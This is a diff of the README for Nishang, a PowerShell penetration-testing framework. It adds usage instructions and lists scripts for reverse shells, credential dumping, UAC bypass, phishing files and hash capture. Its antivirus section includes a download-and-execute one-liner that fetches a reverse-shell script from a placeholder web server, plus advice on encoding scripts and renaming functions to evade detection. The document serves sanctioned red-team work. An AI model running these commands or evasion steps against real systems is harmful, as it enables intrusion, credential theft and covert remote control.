@@ -1,9 +1,67 @@
 #Nishang
 
-###Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and penetration testing. Nishang is useful during various phases of a penetration test and is most powerful for post exploitation usage.
+###Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.
 By [nikhil_mitt](https://twitter.com/nikhil_mitt)
+
+####Usage
+
+Import all the scripts in the current PowerShell session (PowerShell v3 onwards).
+
+PS C:\nishang> Import-Module .\nishang.psm1
+
+Use the individual scripts with dot sourcing.
+
+PS C:\nishang> . C:\nishang\Gather\Get-Information.ps1
+
+PS C:\nishang> Get-Information
+
+To get help about any script or function, use:
+
+PS C:\nishang> Get-Help [scriptname] -full
+
+Note that the help is available for the function loaded after running the script and not the script itself since version 0.3.8. In all cases, the function name is same as the script name.
+
+For example, to see the help about Get-WLAN-Keys.ps1, use
+
+PS C:\nishang> . C:\nishang\Get-WLAN-Keys.ps1
+
+PS C:\nishang> Get-Help Get-WLAN-Keys -Full
+
+####Anti Virus
+Nishang scripts are flagged by many Anti Viruses as malicious. The scrripts on a target are meant to be used in memory which is very easy to do with PowerShell. Two basic methods to execute PowerShell scripts in memory:
+
+Method 1. Use the in-memory dowload and execute:
+Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session.
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
+
+Method 2. Use the -encodedcommand (or -e) parameter of PowerShell
+All the scripts in Nishang export a function with same name in the current PowerShell session. Therefore, make sure the function call is made in the script itself while using encodedcommand parameter from a non-PowerShell shell. For above example, add a function call (without quotes) "Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]".
+
+Encode the scrript using Invoke-Encode from Nishang:
+
+PS C:\nishang> . \nishang\Utility\Invoke-Encode
+
+PS C:\nishang> Invoke-Encode -DataToEncode C:\nishang\Shells\Invoke-PowerShellTcp.ps1 -OutCommand
+
+Encoded data written to .\encoded.txt
+
+Encoded command written to .\encodedcommand.txt
+
+From above, use the encoded script from encodedcommand.txt and run it on a target where commands could be executed (a remote shell, meterpreter native shell, a web shell etc.). Use it like below:
+
+C:\Users\target> powershell -e [encodedscript]
+
+If the scripts still get detected changing the function and parameter names and removing the help content will help.
+
+
 ####Scripts
 Nishang currently contains the following scripts and payloads.
+
+#####ActiveDirectory
+[Get-Unconstrained](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Get-Unconstrained.ps1)
+
+Find computers in active directory which have Kerberos Unconstrained Delegation enabled.
 
 #####Antak - the Webshell
 [Antak](https://github.com/samratashok/nishang/tree/master/Antak-WebShell)
@@ -58,8 +116,23 @@ Create signed JAR files which can be used with applets for script and command ex
 
 [Out-Shortcut](https://github.com/samratashok/nishang/blob/master/Client/Out-Shortcut.ps1)
 
-Create shortcut files capable of executing commands and scripts.
+Create shortcut files capable of executing PowerShell commands and scripts.
 
+[Out-WebQuery](https://github.com/samratashok/nishang/blob/master/Client/Out-WebQuery.ps1)
+
+Create IQY files for phishing credentials and SMB hashes.
+
+[Out-JS](https://github.com/samratashok/nishang/blob/master/Client/Out-JS.ps1)
+
+Create JS files capable of executing PowerShell commands and scripts.
+
+[Out-SCT](https://github.com/samratashok/nishang/blob/master/Client/Out-SCT.ps1)
+
+Create SCT files capable of executing PowerShell commands and scripts.
+
+[Out-SCF](https://github.com/samratashok/nishang/blob/master/Client/Out-SCF.ps1)
+
+Create a SCF file which can be used for capturing NTLM hash challenges. 
 
 #####Escalation
 [Enable-DuplicateToken](https://github.com/samratashok/nishang/blob/master/Escalation/Enable-DuplicateToken.ps1)
@@ -69,6 +142,10 @@ When SYSTEM privileges are required.
 [Remove-Update](https://github.com/samratashok/nishang/blob/master/Escalation/Remove-Update.ps1)
 
 Introduce vulnerabilities by removing patches.
+
+[Invoke-PsUACme](https://github.com/samratashok/nishang/blob/master/Escalation/Invoke-PsUACme.ps1)
+
+Bypass UAC.
 
 #####Execution
 [Download-Execute-PS](https://github.com/samratashok/nishang/blob/master/Execution/Download-Execute-PS.ps1)
@@ -86,6 +163,10 @@ Run PowerShell commands, native commands, or SQL commands on a MSSQL Server with
 [Execute-DNSTXT-Code](https://github.com/samratashok/nishang/blob/master/Execution/Execute-DNSTXT-Code.ps1)
 
 Execute shellcode in memory using DNS TXT queries.
+
+[Out-RundllCommand](https://github.com/samratashok/nishang/blob/master/Execution/Out-RundllCommand.ps1)
+
+Execute PowerShell commands and scripts or a reverse PowerShell session using rundll32.exe.
 
 #####Gather
 [Check-VM](https://github.com/samratashok/nishang/blob/master/Gather/Check-VM.ps1)
@@ -125,6 +206,27 @@ Get WLAN keys in plain text from a target.
 
 Log keystrokes from a target.
 
+[Invoke-MimikatzWdigestDowngrade](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1)
+
+Dump user passwords in plain on Windows 8.1 and Server 2012
+
+[Get-PassHints](https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHints.ps1)
+
+Get password hints of Windows users from a target.
+
+[Show-TargetScreen](https://github.com/samratashok/nishang/blob/master/Gather/Show-TargetScreen.ps1)
+
+Connect back and Stream target screen using MJPEG.
+
+[Invoke-Mimikatz](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1)
+
+Load mimikatz in memory. Updated and with some customisation.
+
+#####MITM
+[Invoke-Interceptor](https://github.com/samratashok/nishang/blob/master/MITM/Invoke-Interceptor.ps1)
+
+A local HTTPS proxy for MITM attacks.
+
 #####Pivot
 [Create-MultipleSessions](https://github.com/samratashok/nishang/blob/master/Pivot/Create-MultipleSessions.ps1)
 
@@ -157,10 +259,57 @@ All the functionality of nishang in a single script module.
 
 #####Shells
 [Invoke-PsGcat](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PsGcat.ps1)
+
 Send commands and scripts to specifed Gmail account to be executed by Invoke-PsGcatAgent
 
 [Invoke-PsGcatAgent](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PsGcatAgent.ps1)
+
 Execute commands and scripts sent by Invoke-PsGcat.
+
+[Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+
+An interactive PowerShell reverse connect or bind shell
+
+[Invoke-PowerShellTcpOneLine](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
+
+Stripped down version of Invoke-PowerShellTcp. Also contains, a skeleton version which could fit in two tweets.
+
+[Invoke-PowerShellUdp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1)
+
+An interactive PowerShell reverse connect or bind shell over UDP
+
+[Invoke-PowerShellUdpOneLine](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdpOneLine.ps1)
+
+Stripped down version of Invoke-PowerShellUdp.
+
+[Invoke-PoshRatHttps](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PoshRatHttps.ps1)
+
+Reverse interactive PowerShell over HTTPS.
+
+[Invoke-PoshRatHttp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PoshRatHttp.ps1)
+
+Reverse interactive PowerShell over HTTP.
+
+[Remove-PoshRat](https://github.com/samratashok/nishang/blob/master/Shells/Remove-PoshRat.ps1)
+
+Clean the system after using Invoke-PoshRatHttps
+
+[Invoke-PowerShellWmi](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellWmi.ps1)
+
+Interactive PowerShell using WMI.
+
+[Invoke-PowerShellIcmp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1)
+
+An interactive PowerShell reverse shell over ICMP.
+
+[Invoke-JSRatRundll](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-JSRatRundll.ps1)
+
+An interactive PowerShell reverse shell over HTTP using rundll32.exe.
+
+[Invoke-JSRatRegsvr](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-JSRatRegsvr.ps1)
+
+An interactive PowerShell reverse shell over HTTP using regsvr32.exe.
+
 
 #####Utility
 [Add-Exfiltration](https://github.com/samratashok/nishang/blob/master/Utility/Add-Exfiltration.ps1)
@@ -195,34 +344,14 @@ Encode and compress a script or string.
 
 Decode and decompress a script or string from Invoke-Encode.
 
+[Start-CaptureServer](https://github.com/samratashok/nishang/blob/master/Utility/Start-CaptureServer.ps1)
+
+Run a web server which logs Basic authentication and SMB hashes.
+
 [Base64ToString]
 [StringToBase64]
 [ExetoText]
 [TexttoExe]
-
-####Usage
-
-Import all the scripts in the current PowerShell session (PowerShell v3 onwards).
-
-PS > Import-Module .\nishang.psm1
-
-Use the individual scripts with dot sourcing.
-
-PS > . C:\nishang\Gather\Get-Information.ps1
-
-PS > Get-Information
-
-To get help about any script, use:
-
-PS > Get-Help [scriptname] -full
-
-Note that the help is available for the function loaded after running the script and not the script itself since version 0.3.8. In all cases, the function name is same as the script name.
-
-For example, to see the help about Get-WLAN-Keys.ps1, use
-
-PS> . C:\nishang\Get-WLAN-Keys.ps1
-
-PS> Get-Help Get-WLAN-Keys
 
 
 ####Updates
